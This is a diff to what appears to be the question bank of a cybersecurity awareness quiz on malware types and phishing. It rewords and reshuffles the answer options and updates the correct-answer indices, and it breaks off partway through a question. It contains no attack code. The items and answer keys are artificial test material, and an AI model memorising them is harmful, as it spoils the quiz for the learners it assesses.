@@ -575,12 +575,12 @@
                 type: "multiple-choice",
                 question: "What is the key difference between a virus and a worm?",
                 options: [
-                    "Viruses require user action to spread, worms spread automatically",
-                    "Worms require user action, viruses spread automatically",
-                    "There is no difference between them",
-                    "Worms are harmless, viruses are dangerous"
+                    "Worms require user clicks to spread",
+                    "Viruses need user action, worms self-spread",
+                    "Both require identical propagation methods",
+                    "Viruses self-spread, worms need users"
                 ],
-                correct: 0,
+                correct: 1,
                 hint: "Think about how each type propagates through systems and networks",
                 explanation: "Viruses attach to files and need users to execute them to spread. Worms exploit network vulnerabilities and spread automatically without any user interaction."
             },
@@ -590,12 +590,12 @@
                 type: "scenario",
                 question: "You discover a program disguised as a legitimate software update that steals credentials when installed. What type of malware is this?",
                 options: [
-                    "Virus",
-                    "Trojan",
-                    "Worm",
-                    "Ransomware"
+                    "Self-replicating virus spreading to files",
+                    "Network worm exploiting vulnerabilities",
+                    "Trojan using deceptive social engineering",
+                    "Ransomware encrypting system data files"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Named after a famous Greek military deception tactic",
                 explanation: "Trojans disguise themselves as legitimate software to trick users into installing them. Unlike viruses, they don't self-replicate and rely on social engineering for distribution."
             },
@@ -605,12 +605,12 @@
                 type: "multiple-choice",
                 question: "What is ransomware's primary characteristic?",
                 options: [
-                    "It replicates itself automatically",
-                    "It encrypts data and demands payment",
-                    "It only steals credentials",
-                    "It crashes the operating system"
+                    "Automatic replication across networks",
+                    "Credential theft from user accounts",
+                    "Encrypts data and demands payment",
+                    "System crash causing data corruption"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Think about what the attacker wants from the victim",
                 explanation: "Ransomware encrypts user data and demands payment (usually in cryptocurrency) for the decryption key. It's a form of digital extortion that has become increasingly common."
             },
@@ -620,12 +620,12 @@
                 type: "multiple-choice",
                 question: "Which malware type operates at the deepest level of the operating system?",
                 options: [
-                    "Adware",
-                    "Spyware",
-                    "Rootkit",
-                    "Trojan"
+                    "Rootkit hiding at kernel level",
+                    "Adware displaying popup windows",
+                    "Trojan disguised as software",
+                    "Spyware monitoring user activity"
                 ],
-                correct: 2,
+                correct: 0,
                 hint: "The name suggests it operates at the 'root' or core level",
                 explanation: "Rootkits operate at the kernel or system level, giving attackers deep access while hiding their presence from security tools and the operating system itself."
             },
@@ -635,12 +635,12 @@
                 type: "multiple-choice",
                 question: "What is the primary purpose of spyware?",
                 options: [
-                    "To encrypt files",
-                    "To monitor and collect user information",
-                    "To display advertisements",
-                    "To replicate itself"
+                    "Display targeted ads constantly",
+                    "Replicate to other systems",
+                    "Encrypt files for ransom",
+                    "Monitor and collect user data"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "The name literally describes what it does",
                 explanation: "Spyware secretly monitors user activity and collects sensitive information like passwords, browsing habits, and personal data without the user's knowledge or consent."
             },
@@ -650,12 +650,12 @@
                 type: "multiple-choice",
                 question: "Which malware requires a host file to attach itself to?",
                 options: [
-                    "Worm",
-                    "Virus",
-                    "Rootkit",
-                    "Ransomware"
+                    "Network worm spreading automatically",
+                    "Kernel-level rootkit hiding malware",
+                    "File-encrypting ransomware payload",
+                    "Virus attaching to executable files"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "This type cannot exist independently and needs another program",
                 explanation: "Viruses must attach themselves to host files or programs to spread. They cannot run independently and need to be executed by the user running the infected file."
             },
@@ -665,12 +665,12 @@
                 type: "scenario",
                 question: "A user reports that pop-up ads appear constantly, even when the browser is closed. What type of malware is likely present?",
                 options: [
-                    "Ransomware",
-                    "Adware",
-                    "Worm",
-                    "Rootkit"
+                    "File-encrypting ransomware infection",
+                    "Auto-spreading network worm malware",
+                    "Advertisement-displaying adware program",
+                    "System-level rootkit concealing itself"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The symptom directly relates to unwanted advertising",
                 explanation: "Adware displays unwanted advertisements, often in intrusive ways. While generally less harmful than other malware, it degrades system performance and user experience."
             },
@@ -680,12 +680,12 @@
                 type: "multiple-choice",
                 question: "What makes a worm particularly dangerous in network environments?",
                 options: [
-                    "It requires manual installation on each computer",
-                    "It can spread rapidly without user interaction",
-                    "It only targets servers",
-                    "It cannot be detected by antivirus"
+                    "Spreads rapidly without user interaction",
+                    "Requires manual install on each system",
+                    "Cannot be detected by antivirus tools",
+                    "Only targets server infrastructure devices"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "Consider how it propagates across networks",
                 explanation: "Worms are particularly dangerous because they exploit network vulnerabilities to spread automatically from system to system without requiring any user action, potentially infecting entire networks rapidly."
             },
@@ -695,12 +695,12 @@
                 type: "multiple-choice",
                 question: "Which malware type typically demands cryptocurrency as ransom payment?",
                 options: [
-                    "Adware",
-                    "Spyware",
-                    "Ransomware",
-                    "Virus"
+                    "Ad-displaying adware programs today",
+                    "Data-monitoring spyware applications",
+                    "Self-replicating virus infections now",
+                    "File-encrypting ransomware attacks"
                 ],
-                correct: 2,
+                correct: 3,
                 hint: "This type extorts money from victims",
                 explanation: "Ransomware typically demands payment in cryptocurrency like Bitcoin because it's harder to trace than traditional payment methods, helping attackers remain anonymous."
             },
@@ -710,12 +710,12 @@
                 type: "scenario",
                 question: "You notice a program that appears legitimate but secretly logs all keystrokes. What is this?",
                 options: [
-                    "A virus disguised as spyware",
-                    "Spyware (specifically a keylogger)",
-                    "A worm with logging capabilities",
-                    "Adware with tracking features"
+                    "Spyware program with keylogger functionality",
+                    "Network worm with logging capabilities",
+                    "Adware with user tracking features",
+                    "Virus disguised as monitoring software"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "This type of program 'spies' on user input",
                 explanation: "This is spyware, specifically a keylogger. It records everything typed on the keyboard to steal passwords, credit card numbers, and other sensitive information."
             },
@@ -725,12 +725,12 @@
                 type: "multiple-choice",
                 question: "What distinguishes a trojan from a virus?",
                 options: [
-                    "Trojans self-replicate, viruses don't",
-                    "Trojans don't self-replicate, viruses do",
-                    "Trojans are always harmless",
-                    "Viruses require network access"
+                    "Viruses need network access always",
+                    "Trojans self-replicate automatically",
+                    "Trojans don't replicate, viruses do",
+                    "Both are always completely harmless"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Think about replication capabilities",
                 explanation: "The key difference is that trojans do not self-replicate. They rely on social engineering to spread, while viruses automatically replicate themselves to other files or systems."
             },
@@ -740,12 +740,12 @@
                 type: "multiple-choice",
                 question: "Which malware type is most likely to exploit network vulnerabilities like SMB?",
                 options: [
-                    "Adware",
-                    "Worm",
-                    "Spyware",
-                    "Trojan"
+                    "Auto-spreading worm malware variants",
+                    "Deceptive trojan horse programs today",
+                    "Advertisement-focused adware software",
+                    "User-monitoring spyware applications"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "This type spreads automatically across networks",
                 explanation: "Worms commonly exploit network protocols and vulnerabilities like SMB (Server Message Block) to spread automatically. Famous examples include WannaCry and NotPetya ransomworms."
             },
@@ -755,12 +755,12 @@
                 type: "scenario",
                 question: "A company's files are encrypted and a message appears demanding Bitcoin payment within 48 hours. What attack occurred?",
                 options: [
-                    "Trojan attack",
-                    "Ransomware attack",
-                    "Virus infection",
-                    "Adware infection"
+                    "Social engineering trojan attack today",
+                    "Self-replicating virus infection spread",
+                    "Ransomware encryption extortion attack",
+                    "Advertisement adware infection present"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The encryption and payment demand are key indicators",
                 explanation: "This is a clear ransomware attack. The encryption of files and demand for cryptocurrency payment with a deadline are signature characteristics of ransomware."
             },
@@ -770,12 +770,12 @@
                 type: "multiple-choice",
                 question: "What is a rootkit's primary objective?",
                 options: [
-                    "To display advertisements",
-                    "To hide malicious activity and maintain persistence",
-                    "To encrypt user files",
-                    "To spread to other computers"
+                    "Encrypt files for ransom payment",
+                    "Spread quickly to other computers",
+                    "Display ads constantly to users",
+                    "Hide activity and maintain persistence"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Think about stealth and concealment",
                 explanation: "Rootkits are designed to hide malicious activity and maintain persistent access to a system while evading detection by security software and system administrators."
             },
@@ -785,12 +785,12 @@
                 type: "multiple-choice",
                 question: "Which malware characteristic indicates it's a virus rather than a trojan?",
                 options: [
-                    "It disguises itself as legitimate software",
-                    "It attaches to and infects other files",
-                    "It requires manual installation",
-                    "It steals user credentials"
+                    "Disguises itself as legitimate software",
+                    "Steals user credentials from systems",
+                    "Attaches to and infects other files",
+                    "Requires manual installation by users"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Consider how it spreads to other files",
                 explanation: "Viruses attach themselves to other files and replicate to spread. This self-replication to other files is a key distinguishing feature from trojans which don't replicate."
             },
@@ -800,10 +800,10 @@
                 type: "scenario",
                 question: "Users report slow computer performance and tracking cookies from unknown advertising networks. What is most likely present?",
                 options: [
-                    "Ransomware",
-                    "Adware",
-                    "Rootkit",
-                    "Worm"
+                    "Network-spreading worm malware infection",
+                    "Adware with tracking cookie installation",
+                    "System-level rootkit hiding processes",
+                    "File-encrypting ransomware infection"
                 ],
                 correct: 1,
                 hint: "Tracking cookies and ads point to this type",
@@ -815,12 +815,12 @@
                 type: "multiple-choice",
                 question: "What makes cryptoransomware different from other malware?",
                 options: [
-                    "It deletes files instead of encrypting them",
-                    "It encrypts files making them inaccessible",
-                    "It only affects Linux systems",
-                    "It spreads via email only"
+                    "Spreads only via email attachments",
+                    "Deletes files instead of encrypting",
+                    "Encrypts files making them inaccessible",
+                    "Only affects Linux-based systems"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The 'crypto' prefix refers to cryptography",
                 explanation: "Cryptoransomware uses encryption to lock users out of their own files. Without the decryption key, files become permanently inaccessible, forcing victims to consider paying the ransom."
             },
@@ -830,12 +830,12 @@
                 type: "multiple-choice",
                 question: "Which malware type could be considered a combination of ransomware and worm capabilities?",
                 options: [
-                    "Ransomworm",
-                    "Spyware",
-                    "Adware",
-                    "Trojan"
+                    "Monitoring spyware with keyloggers",
+                    "Ransomworm encrypting and spreading",
+                    "Deceptive trojan horse programs",
+                    "Advertisement-displaying adware"
                 ],
-                correct: 0,
+                correct: 1,
                 hint: "Think about malware that encrypts AND spreads automatically",
                 explanation: "Ransomworms combine the automatic spreading capability of worms with the file encryption and extortion tactics of ransomware. WannaCry and NotPetya are notorious examples."
             },
@@ -845,12 +845,12 @@
                 type: "scenario",
                 question: "Security logs show a program modifying system files and hiding its processes from Task Manager. What is this likely to be?",
                 options: [
-                    "Adware",
-                    "Virus",
-                    "Rootkit",
-                    "Spyware"
+                    "Self-replicating virus infection",
+                    "Advertisement-displaying adware",
+                    "User-monitoring spyware program",
+                    "System-level rootkit concealment"
                 ],
-                correct: 2,
+                correct: 3,
                 hint: "This malware operates at a very deep system level",
                 explanation: "This behavior is characteristic of a rootkit, which modifies system functions to hide its presence and activities from security tools and system utilities like Task Manager."
             },
@@ -860,12 +860,12 @@
                 type: "multiple-choice",
                 question: "What is the main distribution method for trojans?",
                 options: [
-                    "Automatic network propagation",
-                    "Social engineering and user deception",
-                    "System vulnerability exploitation",
-                    "Email attachment auto-execution"
+                    "Automatic network propagation methods",
+                    "Email attachment auto-execution code",
+                    "System vulnerability exploitation now",
+                    "Social engineering and user deception"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Trojans rely on tricking the user",
                 explanation: "Trojans primarily spread through social engineering - they disguise themselves as legitimate or useful software to trick users into voluntarily installing them."
             },
@@ -875,10 +875,10 @@
                 type: "multiple-choice",
                 question: "Which malware is most likely to capture screenshots and webcam images?",
                 options: [
-                    "Ransomware",
-                    "Spyware",
-                    "Adware",
-                    "Virus"
+                    "File-replicating virus infections",
+                    "User-monitoring spyware programs",
+                    "File-encrypting ransomware attacks",
+                    "Advertisement-displaying adware"
                 ],
                 correct: 1,
                 hint: "This type monitors and records user activity",
@@ -890,10 +890,10 @@
                 type: "scenario",
                 question: "A worm is spreading through your network exploiting a known SMB vulnerability. What should be the immediate priority?",
                 options: [
-                    "Paying the ransom",
-                    "Isolating infected systems and patching the vulnerability",
-                    "Reinstalling the operating system on all computers",
-                    "Ignoring it as worms are harmless"
+                    "Ignore it as worms are harmless",
+                    "Isolate systems and patch vulnerability",
+                    "Reinstall OS on all computers now",
+                    "Pay the ransom demand immediately"
                 ],
                 correct: 1,
                 hint: "Stop the spread first, then fix the root cause",
@@ -905,12 +905,12 @@
                 type: "multiple-choice",
                 question: "What is fileless malware?",
                 options: [
-                    "Malware that deletes all files",
-                    "Malware that runs in memory without writing to disk",
-                    "Malware that only affects network files",
-                    "Malware without malicious code"
+                    "Runs in memory without disk writes",
+                    "Deletes all files from the system",
+                    "Only affects network-based files",
+                    "Contains no malicious code at all"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "It exists in memory rather than as a file",
                 explanation: "Fileless malware operates entirely in memory using legitimate system tools like PowerShell, making it harder to detect since it doesn't write malicious files to disk."
             },
@@ -920,12 +920,12 @@
                 type: "multiple-choice",
                 question: "Which malware delivery method involves embedding malicious code in documents?",
                 options: [
-                    "Network worm propagation",
-                    "Macro-based malware",
-                    "Rootkit installation",
-                    "Adware bundling"
+                    "Automatic network worm propagation",
+                    "Deceptive adware software bundling",
+                    "System-level rootkit installation",
+                    "Macro-based malware in documents"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Office documents can contain executable scripts",
                 explanation: "Macro-based malware uses malicious macros embedded in Office documents. When users enable macros, the malicious code executes and can download additional malware."
             },
@@ -935,12 +935,12 @@
                 type: "scenario",
                 question: "An employee clicks an email attachment labeled 'Invoice.pdf.exe'. What type of attack is this?",
                 options: [
-                    "Legitimate document",
                     "Trojan using file extension deception",
-                    "Worm spreading via email",
-                    "Ransomware that affects PDFs only"
+                    "Network worm spreading via email",
+                    "Ransomware affecting PDFs only",
+                    "Legitimate document from vendor"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "Look at the double file extension carefully",
                 explanation: "This is a trojan using double extension deception. The .pdf in the middle makes users think it's a PDF, but the actual .exe extension means it's an executable program."
             },
@@ -950,12 +950,12 @@
                 type: "multiple-choice",
                 question: "What is a logic bomb?",
                 options: [
-                    "Malware that spreads logically through networks",
-                    "Malware that activates based on specific conditions or triggers",
-                    "A type of ransomware",
-                    "Malware that targets logical drives only"
+                    "Ransomware encrypting logical drives",
+                    "Network worm spreading logically",
+                    "Malware triggering on specific conditions",
+                    "Malware targeting logical partitions"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It waits for a specific trigger before activating",
                 explanation: "A logic bomb is malicious code that remains dormant until specific conditions are met (like a date, system event, or command), then executes its payload."
             },
@@ -965,12 +965,12 @@
                 type: "multiple-choice",
                 question: "Which malware type is most commonly bundled with free software downloads?",
                 options: [
-                    "Rootkit",
-                    "Worm",
-                    "Adware/PUP (Potentially Unwanted Program)",
-                    "Ransomware"
+                    "System-level rootkit concealment",
+                    "Adware/PUP unwanted programs",
+                    "Network-spreading worm malware",
+                    "File-encrypting ransomware"
                 ],
-                correct: 2,
+                correct: 1,
                 hint: "Free software often comes with extra unwanted programs",
                 explanation: "Adware and PUPs are frequently bundled with free software. While not always strictly malicious, they install unwanted toolbars, change browser settings, and display ads."
             },
@@ -980,12 +980,12 @@
                 type: "scenario",
                 question: "Antivirus detects a file that injects malicious code into running processes. What is this technique called?",
                 options: [
-                    "File encryption",
-                    "Process injection",
-                    "Network propagation",
-                    "Macro execution"
+                    "Document macro execution technique",
+                    "Network propagation methodology",
+                    "Process injection attack method",
+                    "File encryption transformation"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The malware is inserting itself into legitimate processes",
                 explanation: "Process injection involves inserting malicious code into legitimate running processes. This helps malware evade detection and gain the privileges of the targeted process."
             },
@@ -995,12 +995,12 @@
                 type: "multiple-choice",
                 question: "What is a dropper in malware terminology?",
                 options: [
-                    "Malware that drops files randomly",
-                    "Initial malware that downloads and installs additional malware",
-                    "Malware that deletes files",
-                    "Software that removes malware"
+                    "Software that removes malware infections",
+                    "Malware that randomly drops files",
+                    "Malware that permanently deletes files",
+                    "Initial malware downloading more payloads"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "It 'drops' or delivers the main malware payload",
                 explanation: "A dropper is a small program designed to download and install more sophisticated malware on a system. It's often used to bypass security by keeping the initial infection small and simple."
             },
@@ -1010,12 +1010,12 @@
                 type: "multiple-choice",
                 question: "Which type of malware mines cryptocurrency using victim's computing resources?",
                 options: [
-                    "Ransomware",
-                    "Cryptojacking malware",
-                    "Adware",
-                    "Spyware"
+                    "Advertisement-displaying adware",
+                    "File-encrypting ransomware attacks",
+                    "Cryptojacking mining malware",
+                    "User-monitoring spyware programs"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It hijacks your computer for cryptocurrency mining",
                 explanation: "Cryptojacking malware secretly uses a victim's CPU/GPU to mine cryptocurrency for the attacker, causing high resource usage, overheating, and increased electricity costs."
             },
@@ -1025,12 +1025,12 @@
                 type: "scenario",
                 question: "A malware analysis reveals code that modifies the Master Boot Record (MBR). What is this type of malware?",
                 options: [
-                    "Adware",
-                    "Boot sector virus/Bootkit",
-                    "Spyware",
-                    "Browser hijacker"
+                    "Advertisement-displaying adware program",
+                    "User-monitoring spyware application",
+                    "Boot sector virus/Bootkit infection",
+                    "Browser hijacker changing settings"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It infects the computer's boot process",
                 explanation: "Boot sector viruses and bootkits infect the Master Boot Record or boot sector, loading before the operating system and making them extremely difficult to remove."
             },
@@ -1040,12 +1040,12 @@
                 type: "multiple-choice",
                 question: "What is the primary indicator that distinguishes ransomware from other malware?",
                 options: [
-                    "It spreads automatically",
-                    "It displays a ransom note demanding payment",
-                    "It hides its presence",
-                    "It monitors user activity"
+                    "Hides presence from security tools",
+                    "Monitors user activity continuously",
+                    "Displays ransom note demanding payment",
+                    "Spreads automatically across networks"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The attacker makes their presence and demands very clear",
                 explanation: "Unlike most malware that tries to remain hidden, ransomware announces itself with a ransom note explaining that files are encrypted and demanding payment for the decryption key."
             },
@@ -1055,12 +1055,12 @@
                 type: "multiple-choice",
                 question: "What is a Remote Access Trojan (RAT)?",
                 options: [
-                    "A tool for legitimate remote administration",
-                    "Malware that gives attackers remote control of infected systems",
-                    "A type of firewall",
-                    "Software for detecting trojans"
+                    "Legitimate remote administration tool",
+                    "Firewall protecting against trojans",
+                    "Malware giving attackers remote control",
+                    "Software designed to detect trojans"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It allows remote control of the victim's computer",
                 explanation: "RATs are trojans that give attackers complete remote control over infected systems, allowing them to steal data, install more malware, or use the system for other attacks."
             },
@@ -1070,12 +1070,12 @@
                 type: "scenario",
                 question: "You discover malware that spreads by exploiting a zero-day vulnerability. What makes this particularly dangerous?",
                 options: [
-                    "It affects zero computers",
-                    "No patch exists yet for the vulnerability it exploits",
-                    "It only works on day zero",
-                    "It leaves zero traces"
+                    "It leaves zero traces on systems",
+                    "It only works on day zero launch",
+                    "No patch exists for the vulnerability",
+                    "It affects zero computers initially"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Zero-day means the vendor has had zero days to fix it",
                 explanation: "Zero-day vulnerabilities have no available patch because they're unknown to the vendor. Malware exploiting them is particularly dangerous as there's no immediate defense until a patch is released."
             },
@@ -1085,12 +1085,12 @@
                 type: "multiple-choice",
                 question: "What is polymorphic malware?",
                 options: [
-                    "Malware that affects multiple operating systems",
-                    "Malware that changes its code to evade signature-based detection",
-                    "Malware with multiple payloads",
-                    "Malware spread through multiple vectors"
+                    "Spread through multiple attack vectors",
+                    "Contains multiple malicious payloads",
+                    "Affects multiple operating systems",
+                    "Changes code to evade signature detection"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "It constantly changes its appearance",
                 explanation: "Polymorphic malware changes its code signature with each infection while maintaining the same functionality, making it difficult for signature-based antivirus to detect."
             },
@@ -1102,12 +1102,12 @@
                 type: "multiple-choice",
                 question: "What is the main goal of a phishing attack?",
                 options: [
-                    "To slow down networks",
-                    "To trick users into revealing sensitive information",
-                    "To encrypt files",
-                    "To display advertisements"
+                    "Encrypt files for ransom payment",
+                    "Display advertisements to users",
+                    "Slow down network bandwidth usage",
+                    "Trick users into revealing sensitive info"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "It's about deception and information theft",
                 explanation: "Phishing attacks use deception to trick users into revealing sensitive information like passwords, credit card numbers, or personal data by impersonating legitimate entities."
             },
@@ -1117,12 +1117,12 @@
                 type: "multiple-choice",
                 question: "What distinguishes spear phishing from regular phishing?",
                 options: [
-                    "Spear phishing uses weapons",
-                    "Spear phishing targets specific individuals or organizations",
-                    "Spear phishing only works via SMS",
-                    "Spear phishing is always harmless"
+                    "Targets specific individuals precisely",
+                    "Always uses SMS text messages",
+                    "Completely harmless to recipients",
+                    "Uses physical spear weapons"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "A spear is precise, not a wide net",
                 explanation: "Spear phishing is highly targeted, using personal information about specific individuals or organizations to make the attack more convincing and effective than mass phishing."
             },
@@ -1132,12 +1132,12 @@
                 type: "scenario",
                 question: "You receive an email from 'paypa1.com' asking you to verify your account. What is the red flag?",
                 options: [
-                    "The email is too short",
-                    "The domain uses '1' instead of 'l' (typosquatting)",
-                    "It's asking for verification",
-                    "Nothing is suspicious"
+                    "Nothing is suspicious at all",
+                    "Email message is too short",
+                    "Domain uses '1' instead of 'l'",
+                    "Asking for account verification"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Look very carefully at the domain spelling",
                 explanation: "This is typosquatting - using a domain that looks similar to a legitimate one. 'paypa1.com' uses the number '1' instead of letter 'l' to deceive users. Always verify domains carefully."
             },
@@ -1147,12 +1147,12 @@
                 type: "multiple-choice",
                 question: "What is whaling in the context of cybersecurity?",
                 options: [
-                    "Phishing attacks targeting high-profile executives",
-                    "Attacks that affect large numbers of users",
-                    "Maritime cybercrime",
-                    "A type of denial of service attack"
+                    "Denial of service attack types",
+                    "Maritime industry cybercrime",
+                    "Attacks affecting large user numbers",
+                    "Phishing targeting high-profile executives"
                 ],
-                correct: 0,
+                correct: 3,
                 hint: "Whales are big fish - think about who the 'big fish' are in companies",
                 explanation: "Whaling targets high-profile executives ('big fish') like CEOs and CFOs who have access to sensitive information and authority to make financial transfers or policy changes."
             },
@@ -1162,12 +1162,12 @@
                 type: "multiple-choice",
                 question: "What is smishing?",
                 options: [
+                    "Phishing using malware payloads",
+                    "Phishing via social media platforms",
                     "Phishing via SMS text messages",
-                    "Phishing that makes you smile",
-                    "Phishing via social media",
-                    "Phishing using malware"
+                    "Phishing that makes you smile"
                 ],
-                correct: 0,
+                correct: 2,
                 hint: "The 'SM' at the beginning is a clue",
                 explanation: "Smishing is phishing conducted via SMS (text messages). Attackers send texts impersonating banks, delivery services, or other entities to steal information or install malware."
             },
@@ -1177,10 +1177,10 @@
                 type: "multiple-choice",
                 question: "What is vishing?",
                 options: [
-                    "Video phishing",
+                    "Virtual reality phishing attacks",
                     "Voice phishing via phone calls",
-                    "Visual phishing",
-                    "Virtual phishing"
+                    "Visual phishing using images",
+                    "Video conference phishing"
                 ],
                 correct: 1,
                 hint: "The 'V' stands for voice",
@@ -1192,10 +1192,10 @@
                 type: "scenario",
                 question: "An email creates urgency: 'Your account will be closed in 24 hours! Click here immediately!' What phishing tactic is this?",
                 options: [
-                    "Authority exploitation",
-                    "Urgency/Fear tactic",
-                    "Curiosity tactic",
-                    "Familiarity tactic"
+                    "Familiarity tactic building trust",
+                    "Urgency/Fear creating time pressure",
+                    "Authority exploitation impersonation",
+                    "Curiosity tactic arousing interest"
                 ],
                 correct: 1,
                 hint: "The attacker wants you to act quickly without thinking",
@@ -1207,12 +1207,12 @@
                 type: "multiple-choice",
                 question: "What is clone phishing?",
                 options: [
-                    "Sending identical emails to multiple recipients",
-                    "Duplicating a legitimate email but replacing links with malicious ones",
                     "Creating fake social media profiles",
-                    "Copying someone's identity"
+                    "Sending identical emails to everyone",
+                    "Duplicating emails with malicious links",
+                    "Copying someone's complete identity"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It involves copying a real email and modifying it",
                 explanation: "Clone phishing duplicates a legitimate email the victim previously received, but replaces legitimate links/attachments with malicious ones, making it appear trustworthy."
             },
@@ -1222,12 +1222,12 @@
                 type: "scenario",
                 question: "An email from 'IT Department' requests your password to 'update security settings'. What should you do?",
                 options: [
-                    "Reply with your password",
-                    "Ignore it - legitimate IT never asks for passwords via email",
-                    "Call the number in the email",
-                    "Click the link to verify"
+                    "Click the verification link provided",
+                    "Call the phone number in email",
+                    "Reply immediately with your password",
+                    "Ignore it - IT never asks passwords"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Think about proper IT security practices",
                 explanation: "Legitimate IT departments never ask for passwords via email. This is a classic phishing attempt. Always verify such requests through official channels, not by responding to the email."
             },
@@ -1237,12 +1237,12 @@
                 type: "multiple-choice",
                 question: "What does HTTPS in a phishing website indicate?",
                 options: [
-                    "The site is completely safe",
-                    "Only the connection is encrypted, the site can still be malicious",
-                    "The site cannot be a phishing site",
-                    "The site is government-approved"
+                    "The site is completely safe always",
+                    "The site is government-approved",
+                    "Connection encrypted, site still malicious",
+                    "The site cannot be phishing ever"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "HTTPS only means the connection is encrypted",
                 explanation: "HTTPS only indicates an encrypted connection, not legitimacy. Attackers can easily obtain SSL certificates for phishing sites. Always verify the domain name and other indicators."
             },
@@ -1252,12 +1252,12 @@
                 type: "scenario",
                 question: "You receive an email with subject 'You've won $1,000,000!' from an unknown lottery. What is this?",
                 options: [
-                    "A legitimate lottery win",
-                    "An advance-fee/lottery phishing scam",
-                    "A marketing email",
-                    "A mistake"
+                    "Marketing email from legitimate company",
+                    "Simple mistake in email delivery",
+                    "Advance-fee/lottery phishing scam",
+                    "Legitimate lottery win notification"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "If you didn't enter a lottery, you can't win it",
                 explanation: "This is a classic advance-fee or lottery scam. Victims are told they won money but must pay fees or provide personal information to claim it. You cannot win a lottery you didn't enter."
             },
@@ -1267,10 +1267,10 @@
                 type: "multiple-choice",
                 question: "Which email greeting suggests a phishing attempt?",
                 options: [
-                    "Dear John Smith,",
-                    "Dear Valued Customer,",
-                    "Hi John,",
-                    "Good morning John,"
+                    "Good morning John Smith today",
+                    "Dear Valued Customer greeting",
+                    "Hi John Smith from IT dept",
+                    "Hello John Smith how are you"
                 ],
                 correct: 1,
                 hint: "Legitimate companies usually have your name in their database",
@@ -1282,10 +1282,10 @@
                 type: "scenario",
                 question: "An email from 'CEO' asks you to urgently purchase gift cards and send the codes. This is likely?",
                 options: [
-                    "A legitimate business expense",
-                    "CEO fraud/Business Email Compromise (BEC)",
-                    "A company gift program",
-                    "A team building activity"
+                    "Team building activity for employees",
+                    "CEO fraud/Business Email Compromise",
+                    "Legitimate business expense request",
+                    "Company gift program for clients"
                 ],
                 correct: 1,
                 hint: "CEOs don't typically request gift cards via email",
@@ -1297,12 +1297,12 @@
                 type: "multiple-choice",
                 question: "What is a common indicator in phishing email URLs?",
                 options: [
-                    "They always use HTTPS",
-                    "They often use misspelled or suspicious domain names",
+                    "They always contain random numbers",
                     "They never use legitimate domains",
-                    "They always contain numbers"
+                    "Misspelled or suspicious domain names",
+                    "They always use HTTPS protocol"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Attackers try to make domains look similar to real ones",
                 explanation: "Phishing URLs often use typosquatting (paypa1.com), subdomain tricks (paypal.malicious.com), or completely different domains. Always carefully examine the full domain name."
             },
@@ -1312,12 +1312,12 @@
                 type: "multiple-choice",
                 question: "What is pretexting in social engineering?",
                 options: [
-                    "Sending texts before calls",
-                    "Creating a fabricated scenario to obtain information",
-                    "Testing network security",
-                    "Previewing emails"
+                    "Previewing emails before sending them",
+                    "Testing network security systematically",
+                    "Sending texts before making phone calls",
+                    "Creating fabricated scenario for info"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Creating a false 'pretext' or scenario",
                 explanation: "Pretexting involves creating a fabricated scenario or identity to manipulate victims into divulging information. The attacker builds trust through the invented pretext before asking for sensitive data."
             },
@@ -1327,12 +1327,12 @@
                 type: "scenario",
                 question: "An email claims to be from your bank but has poor grammar and spelling errors. What does this indicate?",
                 options: [
-                    "The bank hired new staff",
-                    "Likely a phishing attempt - legitimate organizations proofread",
-                    "It's definitely safe",
-                    "All bank emails have errors"
+                    "All bank emails have errors normally",
+                    "The bank hired new staff recently",
+                    "It's definitely safe to trust",
+                    "Likely phishing - organizations proofread"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Professional organizations proofread their communications",
                 explanation: "Poor grammar and spelling errors are red flags for phishing. Legitimate organizations, especially financial institutions, carefully proofread their communications. Many phishing emails originate from non-native speakers."
             },
@@ -1342,12 +1342,12 @@
                 type: "multiple-choice",
                 question: "What is angler phishing?",
                 options: [
-                    "Phishing that uses fishing metaphors",
-                    "Phishing conducted through fake social media customer service accounts",
-                    "Phishing targeting fishermen",
-                    "A type of spear phishing"
+                    "A specialized type of spear phishing",
+                    "Phishing targeting fishermen specifically",
+                    "Fake social media customer service accounts",
+                    "Phishing that uses fishing metaphors"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Anglers 'fish' for victims on social media",
                 explanation: "Angler phishing uses fake social media accounts impersonating customer service to intercept complaints and steal credentials when users try to resolve issues with the fake account."
             },
@@ -1357,12 +1357,12 @@
                 type: "scenario",
                 question: "You receive a LinkedIn message from a recruiter offering a too-good-to-be-true job that requires clicking a link. What should you suspect?",
                 options: [
-                    "A legitimate job opportunity",
-                    "Phishing attempt on social media",
-                    "A networking opportunity",
-                    "Corporate headhunting"
+                    "Corporate headhunting for talent",
